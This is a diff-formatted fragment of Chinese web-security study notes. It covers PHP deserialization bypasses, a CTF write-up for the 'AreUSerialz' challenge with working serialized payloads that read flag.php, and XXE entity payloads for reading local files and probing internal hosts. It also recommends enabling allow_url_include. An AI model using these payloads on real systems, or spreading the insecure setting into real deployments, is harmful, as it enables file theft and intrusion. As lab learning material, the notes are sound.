修饰符）。自 PHP 5.2.0 起，如果将一个未定义 __toString() 方法的对象转换为字符串，会产生 E_RECOVERABLE_ERROR 级别的错误。</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="set-get-isset-unset"><a href="#set-get-isset-unset" class="headerlink" title="__set()    __get()    __isset()    __unset()"></a>__set()    __get()    __isset()    __unset()</h4><p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%B1%9E%E6%80%A7%E9%87%8D%E8%BD%BD.png" alt="属性重载"></p>
+<h4 id="invoke-call"><a href="#invoke-call" class="headerlink" title="__invoke()    __call()"></a>__invoke()    __call()</h4><p>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code> 方法会被自动调用。</p>
+<p>在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用。</p>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>__callStatic(), __set_state(), __clone(), __debugInfo()等和序列化没有多大关系，详情参考官网</p>
+<h3 id="反序列化的利用"><a href="#反序列化的利用" class="headerlink" title="反序列化的利用"></a>反序列化的利用</h3><ul>
+<li><p>__wakeup失效<br>php版本<code>&lt; 5.6.25 | &lt; 7.0.10</code><br>当序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行<br>例：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Demofile&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;f15g_1s_here.php&quot;</span>;&#125;</span><br><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Demofile&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;f15g_1s_here.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/qq_19876131/article/details/52890854">__wakeup()函数失效引发漏洞(CVE-2016-7124)</a></p>
+</li>
+<li><p>使用<code>+</code>绕过正则<br>例：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">preg_match</span>(&#x27;/[oc]:\d+:/i&#x27;, $var)</span><br><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Demofile&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;f15g_1s_here.php&quot;</span>;&#125;</span><br><span class="line"><span class="attribute">O</span>:+<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Demofile&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;f15g_1s_here.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xz.aliyun.com/t/2733">代码审计Day11 - unserialize反序列化漏洞</a></p>
+</li>
+</ul>
+<h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h3><h4 id="无类执行"><a href="#无类执行" class="headerlink" title="无类执行"></a>无类执行</h4><p>地址：<a href="https://ctf.bugku.com/challenges/detail/id/109.html">点login咋没反应 - Bugku CTF</a></p>
+<h5 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h5><p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%97%A0%E7%B1%BB%E6%89%A7%E8%A1%8C-wp1.png" alt="PHP无类执行-wp1"></p>
+<p>右键查看源码，有个css文件</p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%97%A0%E7%B1%BB%E6%89%A7%E8%A1%8C-wp2.png" alt="PHP无类执行-wp2"></p>
+<p>点进去访问如下，发现提示<code>?19190</code></p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%97%A0%E7%B1%BB%E6%89%A7%E8%A1%8C-wp3.png" alt="PHP无类执行-wp3"></p>
+<p>加上<code>?19190</code>访问</p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%97%A0%E7%B1%BB%E6%89%A7%E8%A1%8C-wp4.png" alt="PHP无类执行-wp4"></p>
+<p>访问结果</p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%97%A0%E7%B1%BB%E6%89%A7%E8%A1%8C-wp5.png" alt="PHP无类执行-wp5"></p>
+<p>发现php源码，分析代码逻辑，包含了flag.php文件，满足条件才能输出<code>$flag</code></p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%97%A0%E7%B1%BB%E6%89%A7%E8%A1%8C-wp6.png" alt="PHP无类执行-wp6"></p>
+<p>抓包构造<code>$cookie</code>值，得到flag</p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%97%A0%E7%B1%BB%E6%89%A7%E8%A1%8C-wp7.png" alt="PHP无类执行-wp7"></p>
+<h4 id="有类魔术方法触发"><a href="#有类魔术方法触发" class="headerlink" title="有类魔术方法触发"></a>有类魔术方法触发</h4><p>地址：<a href="https://www.ctfhub.com/#/challenge">CTFHub</a>中的<code>AreUSerialz</code>题目</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 题目</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h5><p>1.<code>include(&quot;flag.php&quot;)</code>;看出flag应该就在这个文件中</p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp1.png" alt="PHP有类魔术方法触发-wp1"></p>
+<p>2.定义了一个<code>FileHandler</code>类，有三个<code>protected属性</code>，并且还有<code>魔术方法</code>和自定义方法</p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp2.png" alt="PHP有类魔术方法触发-wp2"></p>
+<p>3.类结束了有个if语句，这是关键。里面使用到了<code>unserialize()</code>，考点大概率就是反序列化</p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp3.png" alt="PHP有类魔术方法触发-wp3"></p>
+<p>4.执行顺序，由GET传参给<code>$str</code>，然后进行反序列化传给<code>$obj</code>，相当于<code>$obj</code>现在是一个对象，当程序结束，会自动调用<code>$obj</code>对象中的析构方法<code>__destruct()</code>。<code>__destruct()</code>中会调用<code>$obj</code>的<code>process()</code>方法，该方法中的if语句有三条路，当<code>protected属性op==&quot;1&quot;</code>时会执行<code>write()</code>方法，当<code>protected属性op==&quot;2&quot;</code>时会执行<code>read()</code>方法，最后若都不满足上述两个便会执行<code>output()</code>方法输出<code>Bad Hacker!</code></p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp4.png" alt="PHP有类魔术方法触发-wp4"></p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp5.png" alt="PHP有类魔术方法触发-wp5"></p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp6.png" alt="PHP有类魔术方法触发-wp6"></p>
+<p>5.选择执行<code>write()</code>还是<code>read()</code>，有第1步分析可得，应该走<code>read()</code>因为包含了flag大概率会在<code>flag.php</code>文件中，然后去看<code>read()</code>方法我们发现我们还需要用到一个<code>protected属性filename</code>，因为我们要去读<code>flag.php</code>得把这个值传进去</p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp7.png" alt="PHP有类魔术方法触发-wp7"></p>
+<p>6.明确目标任务，GET传入一段序列化字符串满足<code>FileHandler</code>类的定义，并且让<code>$op == &quot;2&quot;</code>和<code>$filename == &quot;flag.php&quot;</code></p>
+<p>注意，这里还有两个考点</p>
+<p>7.一是在最开始执行<code>__destruct()</code>方法时，若<code>$op===&quot;2&quot;</code>则会重新赋值令<code>$op</code>的值为”1”，这使得我们没办法直接去调用<code>read()</code>方法，这里也印证了我们之前的猜测，要获取flag应当执行<code>read()</code>方法而非<code>write()</code>方法。</p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp8.png" alt="PHP有类魔术方法触发-wp8"></p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp9.png" alt="PHP有类魔术方法触发-wp9"></p>
+<p>其实也很好绕过，在<code>__destruct()</code>方法中使用的是<code>===</code>强等于，而<code>read()</code>方法中使用的是<code>==</code>弱等于，我们只需要令<code>$op = &quot; 2&quot; 或 $op = 2</code>，就能绕过限制。</p>
+<p>8.另一个考点是自定义方法<code>is_valid()</code>的绕过，该方法规定字符的ASCII码必须是32-125，而<code>FileHandler</code>类中的属性是<code>protected</code>在序列化后会出现不可见字符\00*\00，转化为ASCII码不符合要求，会返回false。</p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp10.png" alt="PHP有类魔术方法触发-wp10"></p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp11.png" alt="PHP有类魔术方法触发-wp11"></p>
+<p>绕过方法:</p>
+<p>①PHP7.1以上(不包含7.1)版本对属性类型不敏感，<code>public</code>属性序列化不会出现不可见字符，可以用<code>public</code>属性来绕过。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;1ceC0la&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//payload</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;1ceC0la&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>②<code>protected</code>属性会引入\x00*\x00。此时，为了更加方便进行反序列化Payload的传输与显示，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。</p>
+<p>用在线工具得到payload，用S替换s，用\00替换<code>*</code>两侧不可见字符</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span> = <span class="string">&quot;1ceC0la&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改后的payload:</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">&quot;\00*\00op&quot;</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">&quot;\00*\00filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;S:<span class="number">10</span>:<span class="string">&quot;\00*\00content&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;1ceC0la&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>9.最后访问<code>http://192.168.101.155/PHPseri.php/?str=payload</code>，再右键查看源码得到flag</p>
+<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E6%9C%89%E7%B1%BB%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91-wp12.png" alt="PHP有类魔术方法触发-wp12"></p>
+<p>其他：</p>
+<p>做这个题，在本地kali用phpstudy搭环境时遇到了个小问题，在使用<code>file_get_contents()</code>去读文件时，发现报错<code>file_get_contents(flag.php): failed to open stream: No such file or directory in /www/admin/localhost_80/wwwroot/PHPseri.php on line 48</code>，百度后，需要修改php.ini</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">allow_url_fopen = Off</span><br><span class="line">allow_url_include = Off</span><br><span class="line"></span><br><span class="line">改成</span><br><span class="line"></span><br><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">之后重启虚拟机就好了</span><br></pre></td></tr></table></figure>
+
+<h3 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h3><p><a href="https://tool.lu/coderunner/">代码在线运行 - 在线工具 (tool.lu)</a></p>
+<p><a href="http://www.dooccn.com/php/">php代码在线测试,php在线执行 (dooccn.com)</a></p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=36">【小迪安全】WEB漏洞-反序列化之PHP </a></p>
+<p><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">CTF PHP反序列化 - MustaphaMond - 博客园 (cnblogs.com)</a></p>
+<p><a href="https://www.php.net/manual/zh/language.oop5.magic.php#language.oop5.magic.serialize">PHP: 魔术方法 - Manual</a></p>
+<p><a href="https://www.php.net/manual/zh/language.oop5.overloading.php">PHP: 重载 - Manual</a></p>
+<p><a href="https://blog.csdn.net/weixin_35304361/article/details/116533277?utm_term=%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96wp&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-116533277&spm=3001.4430"><em>网鼎杯2020</em>php<em>反序列化</em>,<em>网鼎杯2020</em>[青龙组]–AreUSerialz</a></p>
+<h2 id="Java-挖坑，以后填"><a href="#Java-挖坑，以后填" class="headerlink" title="Java(挖坑，以后填)"></a>Java(挖坑，以后填)</h2><p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="Java反序列化"></p>
+<h3 id="靶场-1"><a href="#靶场-1" class="headerlink" title="靶场"></a>靶场</h3><h4 id="Releases-·-WebGoat-WebGoat-github-com"><a href="#Releases-·-WebGoat-WebGoat-github-com" class="headerlink" title="Releases · WebGoat/WebGoat (github.com)"></a><a href="https://github.com/WebGoat/WebGoat/releases">Releases · WebGoat/WebGoat (github.com)</a></h4><h4 id="CTFHub中的think-java题目"><a href="#CTFHub中的think-java题目" class="headerlink" title="CTFHub中的think_java题目"></a><a href="https://www.ctfhub.com/#/challenge">CTFHub</a>中的<code>think_java</code>题目</h4><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>反序列化工具<code>ysoserial</code>：<a href="https://github.com/frohoff/ysoserial/releases">Releases · frohoff/ysoserial (github.com)</a></p>
+<h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=37">【小迪安全】WEB漏洞-反序列化之Java </a></p>
+]]></content>
+      <categories>
+        <category>小迪安全-Web渗透测试笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XXE&amp;XML</title>
+    <url>/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/</url>
+    <content><![CDATA[<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/XXE&XML.png" alt="XXE&amp;XML"></p>
+<span id="more"></span>
+<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XML被设计为传输和存储数据，XML文档结构包括XML声明，DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML份里，是独立于软件和硬件的信息传输工具。</p>
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE漏洞全称XML  External Entity Injection，即<strong>xml外部实体注入</strong>漏洞，XXE漏洞发生在<strong>应用程序解析XML</strong>输入时，<strong>没有禁止外部实体的加载</strong>，导致可加载而已外部文件，造成<strong>文件读取</strong>、命令执行、<strong>内网端口扫描</strong>、攻击内网网站等危害。</p>
+<h2 id="XML与HTML的主要差异"><a href="#XML与HTML的主要差异" class="headerlink" title="XML与HTML的主要差异"></a>XML与HTML的主要差异</h2><p>XML被设计为传输和存储数据，其焦点是数据内容</p>
+<p>HTML被设计用来显示数据，其焦点是数据外观</p>
+<p>XML旨在传输信息，而HTML旨在显示信息</p>
+<h2 id="玩法"><a href="#玩法" class="headerlink" title="玩法"></a>玩法</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">system</span> <span class="meta-string">&quot;file:///d://test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个<code>&lt;x&gt;&lt;/x&gt;</code>之间执行xxe实体</p>
+<h3 id="内网探针或攻击内网应用（出发漏洞地址）"><a href="#内网探针或攻击内网应用（出发漏洞地址）" class="headerlink" title="内网探针或攻击内网应用（出发漏洞地址）"></a>内网探针或攻击内网应用（出发漏洞地址）</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">rabbit</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.0.103:8081/index.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;rabbit;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的ip地址<code>192.168.0.103</code>是内网地址</p>
+<p>访问没有报错说明<code>index.php</code>文件存在，同时也说明8080端口开放</p>
+<p>对端口探针的话需要用其他协议</p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>该CASE是在expect扩展的PHP环境里执行系统命令</p>
